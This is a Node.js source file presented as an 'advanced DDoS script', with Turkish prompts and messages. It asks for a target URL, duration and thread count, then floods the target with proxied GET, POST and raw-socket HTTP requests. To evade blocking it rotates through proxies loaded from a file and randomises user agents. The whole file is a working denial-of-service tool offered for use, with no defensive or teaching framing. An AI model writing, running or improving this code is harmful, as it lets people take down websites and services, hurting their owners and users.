const axios = require('axios');
const fs = require('fs').promises;
const colors = require('colors');
const { SocksProxyAgent } = require('socks-proxy-agent');
const { HttpsProxyAgent } = require('https-proxy-agent');
const readline = require('readline');
const net = require('net');
const { randomInt } = require('crypto');

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });

let proxies = [];

const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15'
];

function logStatus(message, color = 'white') {
  console.log(message[color]);
}

const getRandom = arr => arr[Math.floor(Math.random() * arr.length)];

async function loadProxies() {
  try {
    const data = await fs.readFile('proxies.txt', 'utf8');
    const list = data.split('\n').map(p => p.trim()).filter(Boolean);

    proxies = [];
    for (const proxy of list) {
      const valid = await testProxy(proxy);
      if (valid) proxies.push(proxy);
    }

    logStatus(`✔ ${proxies.length} geçerli proxy yüklendi!`, 'green');
  } catch {
    logStatus('⚠ proxies.txt dosyası bulunamadı!', 'red');
  }
}

async function testProxy(proxy) {
  const [host, port] = proxy.split(':');
  try {
    const agent = proxy.startsWith('socks') ?
      new SocksProxyAgent(`socks5://${host}:${port}`) :
      new HttpsProxyAgent(`http://${host}:${port}`);

    await axios.get('https://api.ipify.org', { httpAgent: agent, httpsAgent: agent, timeout: 3000 });
    return true;
  } catch {
    return false;
  }
}

function getAgent(proxy) {
  const [host, port] = proxy.split(':');
  if (proxy.includes('socks')) return new SocksProxyAgent(`socks5://${host}:${port}`);
  return new HttpsProxyAgent(`http://${host}:${port}`);
}

async function sendRequest(url, method = 'GET', cookies = {}) {
  const headers = {
    'User-Agent': getRandom(userAgents),
    'Accept': '*/*',
    'Referer': 'https://google.com',
    'Connection': 'keep-alive',
    ...(Object.keys(cookies).length && {
      'Cookie': Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ')
    })
  };

  const proxy = getRandom(proxies);
  const agent = getAgent(proxy);

  try {
    const config = { headers, httpAgent: agent, httpsAgent: agent, timeout: 8000 };
    const res = method === 'POST'
      ? await axios.post(url, { data: Math.random() }, config)
      : await axios.get(url + '?r=' + Math.random().toString(36).substring(2), config);

    return { success: true, status: res.status };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

function rawSocketFlood(host, port, duration) {
  const end = Date.now() + duration * 1000;

  while (Date.now() < end) {
    const socket = net.connect(port, host, () => {
      socket.write(`GET / HTTP/1.1\r\nHost: ${host}\r\nConnection: keep-alive\r\n\r\n`);
    });

    socket.on('error', () => {});
    socket.setTimeout(1000, () => socket.destroy());
  }
}

async function attack({ method, url, duration, threads }) {
  await loadProxies();
  logStatus('\n⚔ Saldırı başlatılıyor...', 'cyan');

  const end = Date.now() + duration * 1000;

  async function worker() {
    while (Date.now() < end) {
      await new Promise(res => setTimeout(res, randomInt(100, 500)));

      const currentMethod = method === 'MIXED'
        ? getRandom(['GET', 'POST', 'SLOWLORIS', 'RAW'])
        : method;

      try {
        if (currentMethod === 'RAW') {
          const { hostname, port } = new URL(url);
          rawSocketFlood(hostname, port || 80, 1);
        } else {
          const result = await sendRequest(url, currentMethod);
          process.stdout.write(result.success ? `[+] ${result.status} `.green : `[-] ${result.error.slice(0, 20)} `.red);
        }
      } catch (err) {
        process.stdout.write(`[-] ${err.message.slice(0, 20)} `.red);
      }
    }
  }

  await Promise.all(Array.from({ length: threads }, () => worker()));
}

async function startPanel() {
  console.clear();
  console.log('🌐 Gelişmiş DDoS Scripti 🌐'.rainbow.bold);
  console.log('1 - GET\n2 - POST\n3 - SLOWLORIS\n4 - RAW Socket\n5 - MIXED'.green);
  const m = await ask('Metod Seç (1-5): ');
  const map = { '1': 'GET', '2': 'POST', '3': 'SLOWLORIS', '4': 'RAW', '5': 'MIXED' };
  const method = map[m] || 'GET';

  const url = await ask('Hedef URL (http://...): ');
  const duration = parseInt(await ask('Süre (sn): ')) || 60;
  const threads = parseInt(await ask('Thread sayısı: ')) || 10;

  await attack({ method, url, duration, threads });
}

function ask(question) {
  return new Promise(res => rl.question(question, res));
}

startPanel();
